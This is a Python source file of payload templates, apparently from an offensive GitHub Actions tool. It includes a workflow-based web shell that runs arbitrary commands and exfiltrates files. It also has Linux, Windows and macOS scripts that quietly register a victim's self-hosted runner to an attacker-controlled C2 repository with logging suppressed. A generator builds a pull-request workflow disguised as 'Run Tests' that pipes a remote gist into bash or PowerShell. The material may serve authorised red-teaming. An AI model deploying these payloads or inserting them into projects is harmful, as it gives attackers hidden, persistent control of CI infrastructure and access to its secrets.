import yaml


class Payloads:
    """Collection of payload template used for various attacks."""

    ROR_SHELL = b"""
name: Web Shell
run-name: Shell - ${{ inputs.runner }} - ${{ inputs.cmd || inputs.download_file }}

on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: false
        type: string
      runner:
        description: "Runner"
        required: true
        type: string
      download_file:
        description: "Download a file instead of running a command."
        required: false
        type: string

jobs:
  build:
    runs-on: ${{ inputs.runner }}
    # We don't specify a shell type here, because it will use the default shell of the underlying OS.
    steps:
      - name: Run
        if: ${{ !inputs.download_file }}
        env:
          RUNNER_TRACKING_ID: 0
        run: ${{ inputs.cmd }}
        continue-on-error: true
      - name: Exfil
        if: ${{ inputs.download_file }}
        continue-on-error: true
        uses: actions/upload-artifact@v4
        with:
          path: ${{ inputs.download_file }}
          name: result
"""

    # Need to make sure we get the OS, Arch, Version right.
    ROR_GIST = """
REG_TOKEN=`echo "{0}" | base64 -d`
C2_REPO={1}
KEEP_ALIVE={4}
export WORKER_LOGRETENTION=1
export RUNNER_LOGRETENTION=1
mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
tar xzf ./{2}
export RUNNER_ALLOW_RUNASROOT="1"
./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "gatox-{5}" --labels "gatox-{5}" > /dev/null 2>&1
rm {2}

if [ "$KEEP_ALIVE" = true ]; then
    export RUNNER_TRACKING_ID=0 && ./run.sh > /dev/null 2>&1
else
    export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
fi
"""

    ROR_GIST_WINDOWS = """
$keep_alive = ${4}
$env:RUNNER_LOGRETENTION=1
$env:WORKER_LOGRETENTION=1
mkdir C:\\.actions-runner1; cd C:\\.actions-runner1
Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/{3}/{2} -OutFile {2}
Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/{2}", "$PWD")
./config.cmd --url https://github.com/{1} --unattended --token {0} --name "gatox-{5}" --labels "gatox-{5}"
$env:RUNNER_TRACKING_ID=0

if ($keep_alive) {{ ./run.cmd }} else {{ Start-Process -WindowStyle Hidden -FilePath "./run.cmd" }}
"""

    ROR_GIST_MACOS = """
REG_TOKEN=`echo "{0}" | base64 -d`
C2_REPO={1}
KEEP_ALIVE={4}

export WORKER_LOGRETENTION=1
export RUNNER_LOGRETENTION=1
mkdir -p $HOME/runner/.actions-runner/ && cd $HOME/runner/.actions-runner/
curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
tar xzf ./{2}
./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "gatox-{5}" --labels "gatox-{5}" > /dev/null 2>&1
rm {2}

if [ "$KEEP_ALIVE" = true ]; then
    export RUNNER_TRACKING_ID=0 && ./run.sh > /dev/null 2>&1
else
    export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
fi
"""

    @staticmethod
    def create_exfil_payload():
        """Creates a Gist hosting an exfiltration payload."""

    @staticmethod
    def create_ror_workflow(
        workflow_name: str,
        run_name: str,
        gist_url: str,
        runner_labels: list,
        target_os: str = "linux",
    ):
        """ """
        yaml_file = {}

        yaml_file["name"] = workflow_name
        yaml_file["run-name"] = run_name if run_name else workflow_name
        yaml_file["on"] = ["pull_request"]

        if target_os == "linux" or target_os == "osx":
            run_payload = f"curl -sSfL {gist_url} | bash > /dev/null 2>&1"
        elif target_os == "win":
            run_payload = f"curl -sSfL {gist_url} | powershell *> $null"

        test_job = {
            "runs-on": runner_labels,
            "steps": [
                {
                    "name": "Run Tests",
                    "run": run_payload,
                    "continue-on-error": "true",
                }
            ],
        }
        yaml_file["jobs"] = {"testing": test_job}

        return yaml.dump(yaml_file, sort_keys=False, default_style="", width=4096)
